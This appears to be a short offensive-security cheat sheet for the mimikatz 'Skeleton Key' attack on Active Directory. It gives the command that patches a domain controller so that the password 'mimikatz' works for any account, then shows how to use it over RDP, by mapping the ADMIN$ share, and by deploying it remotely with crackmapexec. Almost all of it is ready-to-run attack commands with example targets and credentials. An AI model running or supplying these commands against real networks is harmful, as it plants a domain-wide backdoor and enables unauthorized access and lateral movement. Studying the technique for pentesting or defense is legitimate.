# Skeleton Key

    mimikatz "privilege::debug" "misc::skeleton" "exit" (Password is mimikatz)

## Usage:

### 1) RDP

    xfreerdp /v:<IP> /u:<User> /p:<mimikatz> /d:<Domain> #Syntax
    xfreerdp /v:10.10.10.9 /u:CEO /p:mimikatz /d:security.local

### 2) Mapping Remote Shares

    net use <DriveLetter:> \\<IP>\<Share> /user:<User> mimikatz #Syntax
    net use Z: \\10.10.10.9\ADMIN$ /user:Administrator mimikatz

### 3) CrackmapExec/Netexec

    crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'Password123!' -M mimikatz -o COMMAND='misc::skeleton'

